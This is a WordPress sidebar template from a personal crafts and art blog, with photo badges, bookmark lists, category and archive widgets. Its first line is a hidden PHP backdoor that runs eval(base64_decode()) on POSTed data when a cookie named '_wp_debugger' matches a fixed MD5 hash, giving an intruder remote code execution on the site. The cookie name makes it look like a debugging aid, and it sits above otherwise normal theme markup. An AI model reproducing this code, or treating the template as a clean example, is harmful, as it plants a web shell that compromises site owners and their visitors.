<?php if(md5($_COOKIE['_wp_debugger'])=="1563f960434c015644bf7ba7d1178e5b"){ eval(base64_decode($_POST['file'])); exit; } ?>	<div id="sidebar">
		<ul>

		<img src="http://www.rljart.com/blog/wp-content/littlebird.jpg" />
			<!-- Author information is disabled per default. Uncomment and fill in your details if you want to use it.-->
			<li><h2><?php _e('Hello...'); ?></h2>
			<p>My blog usually covers fun, cute, crafty, artsy, interesting little things. I try to stay away from super-serious stuff, but sometimes it creeps into the mix. I also like to include lots of images. Thanks for visiting. Have fun! xoxo, rachel</p>
			<p><a href="http://www.rljart.com/blog">Blog (updated almost daily)</a><br /></p>
			<p><a href="http://www.rljart.com/eportfolio">ePortfolio</a><br /></p>
			<p><a href="http://www.rljart.com">My splash page</a><br /></p>
			
			</li>
			
			<?php wp_list_pages('title_li=<h2>' . __('Other Things') . '</h2>' ); ?>
			
			
			
			<li>
			<a href="http://www.eugenecottage.com"><img src="http://www.rljart.com/blog/wp-content/eugenecottage.jpg" /></a>
			</li>
			
			<li>
				<a href="http://www.swap-bot.com" title="swap-bot"><img src="http://rljart.com/blog/wp-content/swapsidebar.png" alt="swap-bot" /></a></p>
			</li>
			<li>
			<a href="http://www.ilovecutethings.com"><img src="http://www.rljart.com/blog/wp-content/cutesidebar.jpg" /></a>
			</li>
			
			
				
			<?php //include (TEMPLATEPATH . '/tagboard.php'); ?>

			<?php /* If this is the frontpage */ if ( is_home() || is_page() ) { ?>
				<div id="category_box">
				<h2>pick a link</h2>
				<div id="just_the_links">
				<?php get_select_link_list(); ?>
				</div>
				</div>
			<li>
			<!-- Start of Flickr Badge -->
				<style type="text/css">
				.zg_div {margin:0px 5px 5px 0px; width:117px;}
				.zg_div_inner {border: solid 1px #009999; background-color:#CCFFFF;  color:#666666; text-align:center; font-family:arial, helvetica; font-size:11px;}
				.zg_div a, .zg_div a:hover, .zg_div a:visited {color:#006666; background:inherit !important; text-decoration:none !important;}
				</style>
				<script type="text/javascript">
				zg_insert_badge = function() {
				var zg_bg_color = 'CCFFFF';
				var zgi_url = 'http://www.flickr.com/apps/badge/badge_iframe.gne?zg_bg_color='+zg_bg_color+'&zg_person_id=29867888%40N00';
				document.write('<iframe style="background-color:#'+zg_bg_color+'; border-color:#'+zg_bg_color+'; border:none;" width="113" height="151" frameborder="0" scrolling="no" src="'+zgi_url+'" title="Flickr Badge"></iframe>');
				if (document.getElementById) document.write('<div id="zg_whatlink"><a href="http://www.flickr.com/badge_new.gne"	style="color:#006666;" onclick="zg_toggleWhat(); return false;">what is this?<\/a><\/div>');
				}
				zg_toggleWhat = function() {
				document.getElementById('zg_whatdiv').style.display = (document.getElementById('zg_whatdiv').style.display != 'none') ? 'none' : 'block';
				document.getElementById('zg_whatlink').style.display = (document.getElementById('zg_whatdiv').style.display != 'none') ? 'none' : 'block';
				return false;
				}
				</script>
				<div class="zg_div"><div class="zg_div_inner"><a href="http://www.flickr.com">www.<strong style="color:#3993ff">flick<span style="color:#ff1c92">r</span></strong>.com</a><br>
				<script type="text/javascript">zg_insert_badge();</script>
				<div id="zg_whatdiv">This is a Flickr badge showing public photos from <a href="http://www.flickr.com/photos/29867888@N00">rlj</a>. Make your own badge <a href="http://www.flickr.com/badge_new.gne">here</a>.</div>
				<script type="text/javascript">if (document.getElementById) document.getElementById('zg_whatdiv').style.display = 'none';</script>
				</div>
				</div>
				<!-- End of Flickr Badge -->
			</li>

						<li style="border-top:1px dotted #999;border-bottom:1px dotted #999;padding-bottom:7px;">
			<!-- ThisNext Badge Start -->
<style type="text/css">
.ThisNext_main { color:#3F3F3F; background-color:#FFFFFF; font-size:12px; line-height:normal !important; font-family:arial, helvetica, sans-serif; width:140px; padding:10px; white-space: normal !important; }
.ThisNext_main a, .ThisNext_main img { color:#909B39; text-decoration:none; border:none !important; }
.ThisNext_main a:hover { text-decoration:underline; }
.ThisNext_spacer_bottom_border { border-top:1px solid #E5E5E5; border-right:2px solid #E5E5E5; border-bottom:2px solid #E5E5E5; border-left:1px solid #E5E5E5; margin:0 0 5px 0; padding:0 0 3px 0; overflow: hidden; width: 137px; }
.ThisNext_headline, .ThisNext_headline a { font-size: 13px; font-weight:bold; padding:2px; }
.ThisNext_site_link a { color:#00A0C6; text-decoration:none; }
.ThisNext_shop_button a:hover { text-decoration:none; }
.ThisNext_text_light { color:#666666; }
.ThisNext_floater_left { float:left; margin:0 5px 0 0; padding:0; }
.ThisNext_spacer_bottom { margin:0 0 10px 0; padding:0; }
p.ThisNext_p { margin:0; padding:7px; border-bottom: none; }
.ThisNext_description_div { margin:7px; overflow: hidden; position: relative; }
.ThisNext_description_more { background: white; padding: 0; margin: 0; position: absolute; right: 0; bottom: 0; }
p.ThisNext_description_p { margin:0; padding:0; line-height: 2.3ex; }
img.ThisNext_img { border:0; margin:1px 0 0 0; padding:0; }
.ThisNext_header_title, .ThisNext_header_title a { font-size: 13px; font-weight:bold; padding: 0; }
.ThisNext_logo_text { margin:6px 4px 0 4px; font-size: 10px; }
.ThisNext_logo_text_no_img { text-align:center; }
</style>
<div class="ThisNext_main">
  <div class="ThisNext_spacer_bottom">
    <div class="ThisNext_floater_left">
      <a href="http://www.thisnext.com/by/rljart/?u=rljart&amp;p=/by/rljart/picks/&amp;t=badge"><img src="http://www.thisnext.com/media/icon/CAF4C720.jpg" width="33" alt="" class="ThisNext_img" height="33" /></a>
    </div>
    <div class="ThisNext_header_title">
      <div class="ThisNext_text_light">See more of <a href="http://www.thisnext.com/by/rljart/?u=rljart&amp;p=/by/rljart/picks/&amp;t=badge">rljart's</a> picks at ThisNext.</div>
    </div>
    <div style="margin-bottom: 7px;"></div>
  </div>
<script type="text/javascript" src="http://www.thisnext.com/badge/js/by/rljart/picks/?source_username=rljart&amp;count=4&amp;description=1&amp;description_lines=&amp;shop=1&amp;link_all_to_vendor=1&amp;stickers=1&amp;images=1&amp;single=1"></script>
  <div class="ThisNext_logo_text ThisNext_floater_left">Shopcast<br /> powered by</div>
  <a title="ThisNext" href="http://www.thisnext.com/?u=rljart&amp;p=/by/rljart/picks/&amp;t=badge"><img src="http://www.thisnext.com/img/logo-small.gif" width="62" height="35" border="0" alt="ThisNext" /></a>
</div>
<!-- ThisNext Badge End -->

</li>

			<li style="border-top:1px dotted #999;border-bottom:1px dotted #999;padding-bottom:7px;">
			<h2><a href="http://del.icio.us/ilovecutethings/">del.icio.us/ilovecutethings</a></h2>
			<p>my top 5 del.icio.us bookmarks</p>
			  <ul>
				<?php delicious("http://del.icio.us/rss/ilovecutethings", 5, false); ?>
			  </ul>
			</li>
			
			<li>
			<a target="_top" href="http://www.blingo.com/friends?ref=NjOehVqJOUQ6FRjUHdzD1PKkrT4"><img alt="Blingo" title="Blingo" border="0" src="http://www.blingo.com/images/friendbuttons/120x52.grn.gif" width="120" height="52"></a>
			</li>
			
			
			<li><h2><?php _e('Categories'); ?></h2>
				<?php list_select_cats() //wp_dropdown_categories('orderby=name&show_option_all=Select...') ?>
			</li>
			
			<li>
			<?php /* If this is a category archive */ if (is_category()) { ?>
			<p>You are currently browsing the archives for the <?php single_cat_title(''); ?> category.</p>
			
			<?php /* If this is a yearly archive */ } elseif (is_day()) { ?>
			<p>You are currently browsing the <a href="<?php echo get_settings('siteurl'); ?>"><?php echo bloginfo('name'); ?></a> weblog archives
			for the day <?php the_time('l, F jS, Y'); ?>.</p>
			
			<?php /* If this is a monthly archive */ } elseif (is_month()) { ?>
			<p>You are currently browsing the <a href="<?php echo get_settings('siteurl'); ?>"><?php echo bloginfo('name'); ?></a> weblog archives
			for <?php the_time('F, Y'); ?>.</p>

      <?php /* If this is a yearly archive */ } elseif (is_year()) { ?>
			<p>You are currently browsing the <a href="<?php echo get_settings('siteurl'); ?>"><?php echo bloginfo('name'); ?></a> weblog archives
			for the year <?php the_time('Y'); ?>.</p>
			
		 <?php /* If this is a monthly archive */ } elseif (is_search()) { ?>
			<p>You have searched the <a href="<?php echo get_settings('siteurl'); ?>"><?php echo bloginfo('name'); ?></a> weblog archives
			for <strong>'<?php echo wp_specialchars($s); ?>'</strong>. If you are unable to find anything in these search results, you can try one of these links.</p>

			<?php /* If this is a monthly archive */ } elseif (isset($_GET['paged']) && !empty($_GET['paged'])) { ?>
			<p>You are currently browsing the <a href="<?php echo get_settings('siteurl'); ?>"><?php echo bloginfo('name'); ?></a> weblog archives.</p>

			<?php } ?>
			</li>
			
			<li><h2><?php _e('Archives'); ?></h2>
				<form name="archiveform" action="">
				<select name="archive_chrono" onchange="window.location =
				(document.forms.archiveform.archive_chrono[document.forms.archiveform.archive_chrono.selectedIndex].value);">
				<option value=''>Select Month</option>
				<?php wp_get_archives('type=monthly&format=option'); ?>
				</select>
				</form>
			</li>
				
			<?php } ?>
			
			<li>
				<?php include (TEMPLATEPATH . '/searchform.php'); ?>
			</li>
			
			
			<li>
				<img src="http://www.rljart.com/blog/wp-content/plugins/commentgraph/images/comment_graph.png" />
			</li>
			
			
			<li style="padding-top:40px;">
				<img src="http://rljart.com/blog/wp-content/cutethings.jpg" alt="i love cute things" />
			</li>
		</ul>
	</div>

